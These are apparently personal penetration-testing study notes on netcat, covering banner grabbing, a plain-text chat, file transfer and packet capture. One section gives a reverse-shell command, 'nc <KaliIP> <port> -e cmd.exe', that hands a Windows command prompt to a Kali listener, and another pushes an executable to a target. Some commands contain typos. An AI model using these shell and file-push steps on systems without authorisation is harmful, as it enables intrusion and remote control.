# Net Cat:

NetCat does not have encryption, therefore packets are send in clear text and firewall can inspect the packets for any malware.

While doing chat (below), run a packet capture:

Capture packets:
```
tcpdump -x -X -i eth0 'port 4444'
```
You will see the text in plain text.

# nc vs ncat:
ncat does encryption where nc does not.
ncat can also whitelist IP's where nc does not

## Banner grabbing with NC
Gather info from server:
```
nc -nv <targetIP> <targetPort>
```

Example 1 (SMTP):
![[Pasted image 20260419041543.png]]

Example 2 (POP):
![[Pasted image 20260419041708.png]]

Example 3 (IMAP):
![[Pasted image 20260419041829.png]]


Gather info on windows box:
```
nc <ipAddress> <portNumber>
```

Example get info from Web server:
```
nc 10.10.10.1 80
HTTP/1.1 200 # An HTTP header
```

```
nc 10.10.10.1 80
head / http/1.0
```

```
nc 10.10.10.1 22 # For SSH
nc 10.10.10.1 21 # For FTP
```

Find netcat for Windows on Kali:
```
localte nc.exe
```

## Netcat "Chat" System:
Copy NC to windows:
```
scp /usr/share/windows-binaries/nc.exe <username>@<ipAddress>:"C:\Users\<username>\Desktop"
```

You can also copy nc.exe to c:\Windows as c:\Windows is set as a default path

Create a listner (Kali):
```
nc -nlvp 1234
```

1234 => Port number

Windows Box:
```
nc <ipAddressOfKali> <portNumber>
```

Kali:
Type text and it will display on the windows box
Transfer files via NC - This will transfer the file to any device which will connect to Kali on port 1234:

#### Kali:
```
nc -ntvp 1234 < /path/to/file/you/want/to/send
```

#### Windows
```
nc.exe <kaliIP> <portNumber> > c:\Users\<username>\Desktop
```


# Take control of remote server:
Start listener:
```
nc -nlvp 1234
```

#### Remote PC, start cmd.exe:
```
nc <KaliIP> <portNumber> -e cmd.exe
```

-e => Execute

Kali:
Press enter, you will have remote control of device

## Transferring files with nc

On the client machine (Windows), run:
nc -nlvp portNumber > outputFileName.exe

Client device:
```
nc -lvnp 4444 > incomming.exe
```

On the server (Kali) run:
nc -nv targetIP targetPort < location/to/file/you/want/to/tranffer

Example:
```
nc -nv 4444 < /home/script/wget.exe
```

Check on the client PC if the file was tranffered:
```
incomming -h
```
This should display the wget help 